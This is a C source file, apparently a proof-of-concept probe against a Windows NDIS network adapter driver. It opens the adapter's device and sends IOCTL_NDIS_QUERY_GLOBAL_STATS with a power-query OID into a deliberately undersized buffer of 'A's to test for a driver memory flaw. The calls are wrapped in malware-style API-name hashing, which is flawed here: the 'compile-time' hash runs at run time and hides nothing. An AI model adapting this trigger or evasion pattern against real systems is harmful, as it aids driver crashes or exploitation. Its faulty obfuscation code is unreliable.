#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <ntddndis.h>
#include <stdint.h>
#include <stdbool.h>
// adapter_guid.c was used to get the GUID, system unique.
// Windows 8.1 => 11

// Hash function (djb2)
uint32_t hash(const char* str) {
    uint32_t hash = 5381;
    int c;

    while ((c = *str++))
        hash = ((hash << 5) + hash) + c; // hash * 33 + c

    return hash;
}

// Macro to create a compile-time hash of a string literal
#define CT_HASH(str) (hash(str))

// Function prototypes
bool execute_api(uint32_t api_hash, void* params, size_t param_size);

// Define hashes for API calls
#define CREATEFILE_HASH CT_HASH("CreateFile")
#define DEVICEIOCONTROL_HASH CT_HASH("DeviceIoControl")
#define GETLASTERROR_HASH CT_HASH("GetLastError")
#define FPRINTF_HASH CT_HASH("fprintf")
#define MEMSET_HASH CT_HASH("memset")
#define CLOSEHANDLE_HASH CT_HASH("CloseHandle")

int main() {
    // Execute CreateFile API call
    printf("Executing API call based on hash: %u\n", CREATEFILE_HASH);
    execute_api(CREATEFILE_HASH, NULL, 0);

    // Execute GetLastError API call
    printf("Executing API call based on hash: %u\n", GETLASTERROR_HASH);
    execute_api(GETLASTERROR_HASH, NULL, 0);

    // Execute fprintf API call
    printf("Executing API call based on hash: %u\n", FPRINTF_HASH);
    FILE* dummyFile = stderr; // Use stderr as an example
    execute_api(FPRINTF_HASH, (void*)dummyFile, 0);

    // Execute DeviceIoControl API call
    printf("Executing API call based on hash: %u\n", DEVICEIOCONTROL_HASH);
    execute_api(DEVICEIOCONTROL_HASH, NULL, 0);

    // Execute memset API call
    printf("Executing API call based on hash: %u\n", MEMSET_HASH);
    char buffer[10]; // Example buffer for memset
    execute_api(MEMSET_HASH, (void*)buffer, sizeof(buffer));

    // Execute CloseHandle API call
    printf("Executing API call based on hash: %u\n", CLOSEHANDLE_HASH);
    HANDLE dummyHandle = GetStdHandle(STD_INPUT_HANDLE); // Use a dummy handle
    execute_api(CLOSEHANDLE_HASH, (void*)dummyHandle, 0);

    return 0;
}

// Function to execute API call based on hash
bool execute_api(uint32_t api_hash, void* params, size_t param_size) {
    if (api_hash == CREATEFILE_HASH) {
        // Execute CreateFile API call
        HANDLE hDevice = CreateFile(L"\\\\.\\Global\\{1C00A813-78C5-436F-926F-E522BB9D1EDF}", // change me
            GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);

        if (hDevice == INVALID_HANDLE_VALUE) {
            fprintf(stderr, "Failed to open device. Error code: %lu\n", GetLastError());
            return false;
        }
        CloseHandle(hDevice);
    }
    else if (api_hash == DEVICEIOCONTROL_HASH) {
        // Execute DeviceIoControl API call
        HANDLE hDevice = CreateFile(L"\\\\.\\Global\\{1C00A813-78C5-436F-926F-E522BB9D1EDF}", // change me
            GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);

        if (hDevice == INVALID_HANDLE_VALUE) {
            fprintf(stderr, "Failed to open device. Error code: %lu\n", GetLastError());
            return false;
        }

        ULONG oid = OID_PNP_QUERY_POWER;
        UCHAR invalidData[3]; // The size of this buffer may need adjustment
        memset(invalidData, 'A', sizeof(invalidData)); // Fill with 'A's or other invalid data

        DWORD bytesReturned;
        BOOL result = DeviceIoControl(hDevice, IOCTL_NDIS_QUERY_GLOBAL_STATS, &oid,
            sizeof(oid), invalidData, sizeof(invalidData),
            &bytesReturned, NULL);

        if (!result) {
            fprintf(stderr, "DeviceIoControl failed. Error code: %lu\n", GetLastError());
            CloseHandle(hDevice);
            return false;
        }
        else {
            printf("Operation unexpectedly succeeded. Bytes returned: %lu\n", bytesReturned);
            // It's important to check here whether the operation should have succeeded and to analyze the response
        }

        CloseHandle(hDevice);
    }
    else if (api_hash == FPRINTF_HASH) {
        // Execute fprintf API call
        fprintf((FILE*)params, "Error occurred.\n");
    }
    else if (api_hash == GETLASTERROR_HASH) {
        // Execute GetLastError API call
        printf("Last error code: %lu\n", GetLastError());
    }
    else if (api_hash == MEMSET_HASH) {
        // Execute memset API call
        memset(params, 0, param_size);
    }
    else if (api_hash == CLOSEHANDLE_HASH) {
        // Execute CloseHandle API call
        CloseHandle((HANDLE)params);
    }
    // Add more API calls as needed
    return true;
}
